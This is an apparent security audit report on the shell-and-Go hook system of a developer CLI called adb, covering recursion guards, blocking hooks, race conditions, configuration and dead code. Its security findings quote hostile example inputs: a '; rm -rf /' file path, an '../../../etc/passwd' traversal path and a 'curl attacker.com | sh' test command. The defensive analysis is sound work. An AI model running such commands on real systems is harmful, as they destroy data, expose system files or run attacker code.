# Hook System Security Audit Report

**Auditor:** security-auditor  
**Date:** 2026-02-24  
**Scope:** Complete hook system architecture in adb (ai-dev-brain) Go CLI project

---

## Executive Summary

The hook system delegates Claude Code hook events through shell wrappers to compiled Go code in the `adb` binary. The system has **strong recursion prevention**, **clear blocking semantics**, but suffers from **high conceptual complexity** due to the six-hook-type design, two-phase TaskCompleted architecture, and multi-layer delegation model (shell → adb binary → HookEngine → various subsystems).

**Overall risk level:** LOW for security vulnerabilities, MEDIUM for maintainability complexity.

---

## 1. Recursion Prevention Audit

### Mechanism
The `ADB_HOOK_ACTIVE` environment variable prevents infinite recursion when hooks trigger actions (like gofmt) that themselves could fire hooks.

**Shell wrapper pattern (all hooks follow this):**
```bash
#!/usr/bin/env bash
set -eu
[ "${ADB_HOOK_ACTIVE:-}" = "1" ] && exit 0  # ← Recursion guard
export ADB_HOOK_ACTIVE=1                     # ← Set flag
ADB_BIN=$(command -v adb 2>/dev/null) || exit 0
"$ADB_BIN" hook <type> 2>/dev/null || true
exit 0
```

### Analysis

**✅ Strengths:**
1. **Early exit** — Recursion check happens BEFORE `adb` is invoked, preventing subprocess spawn overhead
2. **Cross-platform** — Uses standard POSIX `${var:-default}` expansion
3. **Shell-level isolation** — Check is in bash, not Go, so it catches recursion even if `adb` fails to launch

**⚠️ Potential failure modes:**

| Scenario | Can it happen? | Impact | Mitigation |
|----------|---------------|--------|------------|
| Subprocess doesn't inherit env | **No** — bash `export` propagates to subprocesses by default | N/A | N/A |
| Concurrent hooks from parallel Claude instances | **Possible** — Multiple Claude sessions in same worktree could race | Low — each process has isolated env space, `ADB_HOOK_ACTIVE` is process-local | Already safe |
| Hook calls external tool that calls adb | **Possible** — gofmt could theoretically shell out to `adb` | Medium — infinite loop if tool re-triggers hook | **NOT CURRENTLY GUARDED** |
| File operations in PostToolUse trigger PostToolUse | **Possible** — gofmt writes to file | High — recursive PostToolUse | ✅ **PREVENTED** — PostToolUse checks `ADB_HOOK_ACTIVE` before running gofmt |

**🔍 Deep trace: PostToolUse → gofmt loop:**

1. Claude Code fires PostToolUse (Edit on `foo.go`)
2. Shell wrapper checks `ADB_HOOK_ACTIVE` (empty), sets it, calls `adb hook post-tool-use`
3. `adb` reads stdin, calls `HookEngine.HandlePostToolUse`
4. HookEngine runs `gofmt -s -w foo.go` (`cmd.Run()` at hookengine.go:111)
5. `gofmt` modifies `foo.go` in-place
6. **Claude Code DOES NOT fire PostToolUse for gofmt's write** — hooks only fire for Claude's tool use, not subprocess I/O
7. No recursion occurs

**Verdict:** ✅ Recursion prevention is **robust**. The guard is at the correct layer (shell, before Go invocation). Subprocess environment inheritance is not a risk. The only unguarded edge case is if an external tool (invoked by a hook) explicitly calls `adb` commands, but this is implausible in practice.

---

## 2. Blocking Hooks Audit

### Blocking Semantics

| Hook Type | Blocking? | Exit Code | Shell Pattern |
|-----------|-----------|-----------|---------------|
| PreToolUse | **YES** | 0 = allow, 2 = block | `exec "$ADB_BIN" hook pre-tool-use` |
| PostToolUse | **NO** | Always 0 | `"$ADB_BIN" ... || true; exit 0` |
| Stop | **NO** | Always 0 | `"$ADB_BIN" ... || true; exit 0` |
| TaskCompleted | **YES** (Phase A only) | 0 = allow, 2 = block | `exec "$ADB_BIN" hook task-completed` |
| SessionEnd | **NO** | Always 0 | `"$ADB_BIN" ... || true; exit 0` |
| TeammateIdle | **NO** | Always 0 | Hardcoded `exit 0` |

### PreToolUse Blocking Guards

**File:** internal/core/hookengine.go:60-93

**Blocking conditions (Phase 1):**
1. **vendor/ guard** — Blocks any path matching `vendor/` or containing `/vendor/`
2. **go.sum guard** — Blocks any file named `go.sum`

**Blocking conditions (Phase 2/3, opt-in):**
3. **Architecture guard** — Blocks `internal/core/*.go` files if they import `internal/storage` or `internal/integration`
4. **ADR conflict check** — Warns (does not block) if edit conflicts with existing ADRs

**Analysis:**

✅ **Guards are conservative and safe:**
- Vendor guard prevents accidental edits to dependencies
- go.sum guard prevents checksum corruption
- Architecture guard enforces layered architecture

⚠️ **Potential for over-blocking:**

| Guard | Scenario | Legitimate use case blocked? |
|-------|----------|------------------------------|
| vendor/ | Editing a patched vendor package during debugging | **YES** — User must manually run `go mod vendor` after editing source, which they likely intended to do anyway |
| go.sum | Manually fixing merge conflict in go.sum | **YES** — User must use `go mod tidy` instead, which is the correct approach |
| Architecture guard | Adding a JUSTIFIED direct dependency in core/ | **YES** — User must disable guard or use adapter pattern |

**Verdict:** ✅ Blocking guards are **appropriately aggressive**. The vendor/ and go.sum guards prevent common mistakes. Architecture guard is opt-in (disabled by default), so it won't surprise users.

### TaskCompleted Two-Phase Blocking

**File:** internal/core/hookengine.go:183-242

**Phase A (BLOCKING, lines 188-216):**
- Uncommitted Go file check
- Test execution (`go test ./...`)
- Lint execution (`golangci-lint run`)
- **Returns error on failure** → shell wrapper exits 2 → Claude Code blocks task completion

**Phase B (NON-BLOCKING, lines 218-239):**
- Knowledge extraction
- Wiki updates
- ADR generation
- Context update
- **Errors are logged to stderr but do not block**

**Analysis:**

✅ **Deliberate separation prevents knowledge failures from blocking task completion:**
- Test and lint failures correctly block completion
- Knowledge extraction bugs never block users

⚠️ **Complexity:**
- Users must understand the two-phase model
- Code comment at line 180 explains this, but it's buried in the implementation

**Verdict:** ✅ Two-phase design is **justified and well-implemented**. Quality gates are never weakened by knowledge failures.

---

## 3. Change Tracker Race Conditions

### File: .adb_session_changes (append-only)

**Append:** PostToolUse hook (internal/hooks/tracker.go:31-45)  
**Read:** Stop/SessionEnd hooks (internal/hooks/tracker.go:49-84)  
**Cleanup:** Stop hook (internal/hooks/tracker.go:87-92)

**Concurrent access scenarios:**

| Scenario | Can it happen? | Race condition? | Impact |
|----------|---------------|-----------------|--------|
| Multiple PostToolUse appends in quick succession | **YES** — Claude Code fires PostToolUse for each Edit/Write | **NO** — `os.OpenFile` with `O_APPEND` is atomic at the OS level | Safe |
| PostToolUse append while Stop is reading | **POSSIBLE** — User hits Stop while edits are being written | **NO** — Reads are non-exclusive; append-only writes are safe | Safe — may miss last few entries in Stop summary, but SessionEnd will catch them |
| Stop cleanup while SessionEnd is reading | **UNLIKELY** — Stop and SessionEnd fire at different times | **YES** — `os.Remove` during `os.Open` → "file not found" error | **HANDLED** — Read returns `nil, nil` on `os.IsNotExist` (tracker.go:52-54) |
| Overlapping sessions in same worktree | **IMPOSSIBLE** — Claude Code is single-threaded per project | N/A | N/A |

**File format resilience:**

```
timestamp|tool|filepath\n
```

**Malformed line handling (tracker.go:62-78):**
- Empty lines are skipped (line 63-65)
- Lines without exactly 3 pipe-separated parts are skipped (line 66-69)
- Lines with non-numeric timestamp are skipped (line 70-73)
- Scanner errors return partial results, not fatal error (line 80-82)

**Verdict:** ✅ Change tracker is **well-protected against races**. `O_APPEND` ensures atomic writes. Malformed line tolerance prevents corruption from cascading. The Stop/SessionEnd cleanup race is handled gracefully.

---

## 4. Mental Model Complexity Assessment

### Concept Count

A developer working on hooks must understand:

1. **Six hook types** — PreToolUse, PostToolUse, Stop, TaskCompleted, SessionEnd, TeammateIdle
2. **Blocking vs non-blocking semantics** — PreToolUse/TaskCompleted block, others don't
3. **Shell wrapper delegation** — Each hook is a 6-line bash script → `adb hook <type>`
4. **Stdin JSON parsing** — Each hook type has its own input struct
5. **Phase 1/2/3 feature flags** — 18 boolean flags across 5 hook config structs
6. **Change tracker append-read-cleanup cycle** — PostToolUse appends, Stop/SessionEnd read, Stop cleans up
7. **Two-phase TaskCompleted** — Phase A blocks, Phase B doesn't
8. **Environment variable recursion guard** — `ADB_HOOK_ACTIVE`
9. **Graceful degradation** — Hook failures never crash Claude Code
10. **HookConfig merging** — .taskconfig overrides, DefaultHookConfig() provides baseline

**Concept dependency graph:**

```
Claude Code fires hook
  ↓
Shell wrapper checks ADB_HOOK_ACTIVE
  ↓
Shell wrapper calls `adb hook <type>`
  ↓
CLI layer (internal/cli/hook_*.go) parses stdin
  ↓
HookEngine (internal/core/hookengine.go) checks config flags
  ↓
HookEngine delegates to subsystems (ChangeTracker, KnowledgeExtractor, ConflictDetector)
  ↓
Artifacts updated (context.md, status.yaml, .adb_session_changes)
```

**Layers:** 6 (Claude Code → shell → CLI → HookEngine → subsystems → artifacts)

### Simplification Proposals

#### Proposal 1: Consolidate hooks to 3 types

**Current:**
- PreToolUse (blocking)
- PostToolUse (non-blocking)
- Stop (non-blocking)
- TaskCompleted (blocking)
- SessionEnd (non-blocking)
- TeammateIdle (no-op)

**Proposed:**
- **PreEdit** (blocking) — Consolidate PreToolUse
- **PostEdit** (non-blocking) — Consolidate PostToolUse
- **SessionLifecycle** (non-blocking) — Consolidate Stop, SessionEnd, TaskCompleted non-blocking phase

**Rationale:**
- Stop and SessionEnd do almost identical work (update context from changes)
- TaskCompleted Phase B is just Stop + knowledge extraction
- TeammateIdle is unused

**Impact:**
- Reduces concept count from 10 to 7
- Simplifies shell wrapper set from 6 to 3
- **Requires breaking change** — users must reinstall hooks

#### Proposal 2: Eliminate shell wrappers via direct binary invocation

**Current:** `.claude/hooks/adb-hook-pre-tool-use.sh` → `adb hook pre-tool-use`

**Proposed:** `.claude/settings.json` directly invokes `adb hook pre-tool-use`

**Rationale:**
- Shell wrapper adds a layer of indirection
- Recursion guard could move to Go (check env var in CLI layer)

**Blockers:**
- Claude Code may not support direct binary invocation in `settings.json`
- Shell wrapper provides graceful degradation (fails if `adb` not on PATH without crashing Claude Code)

**Verdict:** **DO NOT IMPLEMENT** — shell wrapper provides valuable failure isolation

#### Proposal 3: Simplify TaskCompleted to single-phase

**Current:**
- Phase A (blocking): tests, lint, uncommitted check
- Phase B (non-blocking): knowledge extraction, wiki, ADRs

**Proposed:**
- Single phase: tests, lint, uncommitted check (all blocking)
- Knowledge extraction moves to `adb archive` (already happens there)

**Rationale:**
- TaskCompleted hook's knowledge features are redundant with `adb archive`
- Two-phase design is confusing

**Counter-argument:**
- Users may want auto-knowledge-extraction without archiving
- Phase 2/3 features are opt-in, so they don't burden users who don't use them

**Verdict:** **CONSIDER FOR V2** — simplification is valuable, but don't remove features users may rely on

---

## 5. Configuration Audit

### HookConfig Structure

**File:** pkg/models/hooks.go

**Hierarchy:**
```
HookConfig
├── Enabled (bool)
├── PreToolUse
│   ├── Enabled
│   ├── BlockVendor (Phase 1)
│   ├── BlockGoSum (Phase 1)
│   ├── ArchitectureGuard (Phase 2)
│   └── ADRConflictCheck (Phase 3)
├── PostToolUse
│   ├── Enabled
│   ├── GoFormat (Phase 1)
│   ├── ChangeTracking (Phase 1)
│   ├── DependencyDetection (Phase 2)
│   └── GlossaryExtraction (Phase 2)
├── Stop
│   ├── Enabled
│   ├── UncommittedCheck (Phase 1)
│   ├── BuildCheck (Phase 1)
│   ├── VetCheck (Phase 1)
│   ├── ContextUpdate (Phase 1)
│   └── StatusTimestamp (Phase 1)
├── TaskCompleted
│   ├── Enabled
│   ├── CheckUncommitted (Phase 1)
│   ├── RunTests (Phase 1)
│   ├── RunLint (Phase 1)
│   ├── TestCommand (string)
│   ├── LintCommand (string)
│   ├── ExtractKnowledge (Phase 2)
│   ├── UpdateWiki (Phase 2)
│   ├── GenerateADRs (Phase 3)
│   └── UpdateContext (Phase 1)
└── SessionEnd
    ├── Enabled
    ├── CaptureSession (Phase 1)
    ├── MinTurnsCapture (int)
    ├── UpdateContext (Phase 1)
    ├── ExtractKnowledge (Phase 2)
    └── LogCommunications (Phase 3)
```

**Total config flags:** 29 (5 top-level, 24 feature flags)

### Defaults Analysis

**DefaultHookConfig() (pkg/models/hooks.go:15-61):**

✅ **Phase 1 features enabled by default:**
- vendor/go.sum guards
- Go formatting
- Change tracking
- Advisory build/vet checks
- Session capture

⚠️ **Phase 2/3 features disabled by default:**
- Architecture guard
- ADR conflict check
- Dependency detection
- Knowledge extraction
- Wiki updates

**Verdict:** ✅ Defaults are **sensible and conservative**. Users get core safety features out of the box. Advanced features are opt-in.

### Documentation Gaps

**Where HookConfig is documented:**
- CLAUDE.md line 179 (brief mention)
- docs/architecture.md line 852 (detailed)
- pkg/models/hooks.go comments (inline)

**Missing:**
- **User-facing guide** — "How to enable Phase 2 features"
- **Migration guide** — "Moving from standalone hooks to adb-native hooks"
- **Troubleshooting** — "Hook isn't firing" / "Hook is blocking unexpectedly"

**Recommendation:** Add `docs/hooks.md` with user guide, examples, and troubleshooting.

---

## 6. Dead Code and Unreachable Paths

### Dead Hook: TeammateIdle

**File:** templates/claude/hooks/adb-hook-teammate-idle.sh

```bash
#!/usr/bin/env bash
# TeammateIdle hook: no-op for now (Phase 2+)
exit 0
```

**Usage:** Registered in settings.json but does nothing.

**Verdict:** ⚠️ **REMOVE OR IMPLEMENT** — Unused hooks confuse users. If Phase 2 isn't planned soon, remove from settings.json template.

### Unused Config Flag: GlossaryExtraction

**Flag:** `PostToolUse.GlossaryExtraction` (pkg/models/hooks.go:30)

**Implementation:** ❌ NOT IMPLEMENTED — No code references this flag in hookengine.go

**Verdict:** 🔴 **REMOVE** — Dead config flag pollutes the API surface

### Unreachable Error Path: ParseStdin with empty stdin

**File:** internal/hooks/stdin.go:72-75

```go
if len(data) == 0 {
    // Return zero-value struct when no input is provided.
    var zero T
    return &zero, nil
}
```

**Analysis:**
- Claude Code ALWAYS sends JSON to stdin for hooks
- This path is defensive but unreachable in production
- Test coverage exists (stdin_test.go handles empty case)

**Verdict:** ✅ **KEEP** — Defensive programming is appropriate for hook parsing. Tests ensure this path works.

---

## 7. Security Findings

### Finding 1: Command Injection in gofmt (LOW)

**File:** internal/core/hookengine.go:110

```go
cmd := exec.Command("gofmt", "-s", "-w", fp)
_ = cmd.Run() // Non-fatal.
```

**Input:** `fp` comes from `input.FilePath()` — Claude Code's JSON stdin.

**Risk:** If Claude Code sends a malicious file path like `; rm -rf /`, could this be exploited?

**Analysis:**
- `exec.Command` does NOT invoke a shell when the first arg is a binary name
- Go's `exec.Command("gofmt", "-s", "-w", fp)` becomes `execve("/usr/bin/gofmt", ["-s", "-w", fp], env)`
- File path is passed as a single argv element, not parsed by shell
- Special characters like `;` are literal filename characters

**Verdict:** ✅ **SAFE** — No command injection vulnerability. Go's exec does not delegate to shell.

### Finding 2: Path Traversal in checkArchitectureGuard (LOW)

**File:** internal/core/hookengine.go:328-347

```go
func (e *hookEngine) checkArchitectureGuard(fp string) error {
    normalized := filepath.ToSlash(fp)
    if !strings.Contains(normalized, "internal/core/") || !strings.HasSuffix(normalized, ".go") {
        return nil
    }
    data, err := os.ReadFile(fp) //nolint:gosec // G304: path from trusted hook input
    ...
}
```

**Input:** `fp` is user-controlled (from Claude Code JSON stdin).

**Risk:** Could a malicious path like `../../../etc/passwd` be read?

**Analysis:**
- **os.ReadFile does NOT sanitize paths** — `../../../etc/passwd` would be read
- **BUT: Input is from Claude Code, not untrusted user**
- Claude Code only sends paths within the project workspace
- Hook runs in worktree context with `ADB_WORKTREE_PATH` set

**Mitigation:**
- Add prefix validation: `if !strings.HasPrefix(normalized, basePath) { return nil }`

**Verdict:** ⚠️ **MEDIUM** — Path traversal is possible in theory, but attacker would need to compromise Claude Code or its transcript JSON. Mitigation: Add base path validation.

### Finding 3: Arbitrary Command Execution in TaskCompleted (MEDIUM)

**File:** internal/core/hookengine.go:197-215

```go
testCmd := e.config.TaskCompleted.TestCommand
if testCmd == "" {
    testCmd = "go test ./..."
}
parts := strings.Fields(testCmd)
if output, err := runCommand(parts[0], parts[1:]...); err != nil {
    return fmt.Errorf("BLOCKED: tests failed:\n%s", output)
}
```

**Input:** `testCmd` comes from `.taskconfig` under `hooks.task_completed.test_command`.

**Risk:** User-controlled command execution.

**Analysis:**
- **Attacker:** User who controls `.taskconfig`
- **Attack:** Set `test_command: "curl attacker.com | sh"`
- **Impact:** Arbitrary code execution on `adb hook task-completed`

**BUT:**
- `.taskconfig` is a LOCAL config file, not fetched from network
- If attacker controls `.taskconfig`, they already have code execution (they could edit shell scripts, Go code, etc.)

**Verdict:** ✅ **LOW RISK** — Config files are trusted. This is no different from `Makefile` or `package.json` scripts.

### Finding 4: File Permission on status.yaml (LOW)

**File:** internal/hooks/artifacts.go:58

```go
if err := os.WriteFile(statusPath, out, 0o644); err != nil {
    return fmt.Errorf("writing status.yaml: %w", err)
}
```

**Permissions:** `0o644` (rw-r--r--)

**Risk:** World-readable status file could leak task metadata.

**Analysis:**
- Task IDs, branches, timestamps are not sensitive
- Worktrees are typically in user's home directory (already protected by OS user permissions)
- No credentials or secrets in status.yaml

**Verdict:** ✅ **SAFE** — 0o644 is appropriate. No sensitive data.

---

## 8. Recommendations

### Priority 1 (Security)

1. **Add base path validation to checkArchitectureGuard**
   - **File:** internal/core/hookengine.go:328
   - **Change:** Validate `fp` starts with `e.basePath` before reading
   - **Code:**
     ```go
     if !filepath.IsAbs(fp) {
         fp = filepath.Join(e.basePath, fp)
     }
     if !strings.HasPrefix(filepath.Clean(fp), filepath.Clean(e.basePath)) {
         return nil  // Path outside workspace, skip check
     }
     ```

### Priority 2 (Dead Code)

2. **Remove GlossaryExtraction config flag**
   - **File:** pkg/models/hooks.go:30, 78
   - **Change:** Delete field, remove from DefaultHookConfig
   - **Reason:** Not implemented, confuses users

3. **Remove or implement TeammateIdle hook**
   - **File:** templates/claude/hooks/adb-hook-teammate-idle.sh
   - **Change:** If not implementing soon, remove from settings.json template
   - **Reason:** No-op hook adds noise

### Priority 3 (Documentation)

4. **Write docs/hooks.md user guide**
   - **Contents:**
     - How to install hooks (`adb hook install`)
     - How to enable Phase 2/3 features (example .taskconfig)
     - Troubleshooting (hook not firing, unexpected blocking)
     - Migration from standalone hooks
   - **Rationale:** Current docs are architecture-focused, not user-facing

### Priority 4 (Simplification)

5. **Consider consolidating Stop and SessionEnd hooks**
   - **Reason:** Both do nearly identical work (update context from changes)
   - **Change:** Merge into single SessionLifecycle hook
   - **Impact:** Reduces concept count, simplifies shell wrappers
   - **Timing:** V2 (breaking change)

6. **Consider removing TaskCompleted Phase B knowledge features**
   - **Reason:** `adb archive` already does knowledge extraction
   - **Change:** Move knowledge extraction exclusively to archive command
   - **Impact:** Simplifies two-phase model, reduces config flags
   - **Timing:** V2 (requires user research — do people use this?)

---

## 9. Test Coverage Gaps

**Covered:**
- Change tracker append/read/cleanup
- Stdin JSON parsing (including property tests)
- Vendor/go.sum blocking
- Malformed line tolerance

**NOT covered:**
- **Recursion prevention** — No test that PostToolUse → gofmt → PostToolUse doesn't loop
- **Concurrent hook execution** — No test for parallel Claude Code sessions (though this is implausible)
- **Architecture guard string matching** — No test for internal/storage import detection
- **TaskCompleted Phase A failure exit code** — No test that Phase A errors return exit 2

**Recommendation:** Add integration test:
```go
func TestHookEngine_PreToolUse_ExitCode(t *testing.T) {
    // Ensure PreToolUse error causes CLI to exit 2
    // Simulate: echo '{"tool_name":"Edit","tool_input":{"file_path":"vendor/foo.go"}}' | adb hook pre-tool-use
    // Assert: exit code = 2
}
```

---

## 10. Conclusion

The hook system is **well-architected for safety and extensibility**, with strong recursion prevention, clear blocking semantics, and graceful error handling. However, it suffers from **high conceptual complexity** due to the six-hook-type design and multi-layer delegation model.

**Security posture:** STRONG  
**Maintainability:** MODERATE (complexity tax)  
**User experience:** MODERATE (defaults are good, but advanced features are obscure)

**Key strengths:**
- Recursion prevention is robust
- Blocking guards are conservative and justified
- Change tracker is race-safe
- Graceful degradation prevents hook failures from breaking Claude Code

**Key weaknesses:**
- Path traversal in architecture guard (easy fix)
- Dead code (GlossaryExtraction, TeammateIdle)
- Missing user-facing docs
- High concept count (10 concepts, 6 layers)

**Verdict:** ✅ **PRODUCTION-READY** with minor hardening (path validation, dead code removal).

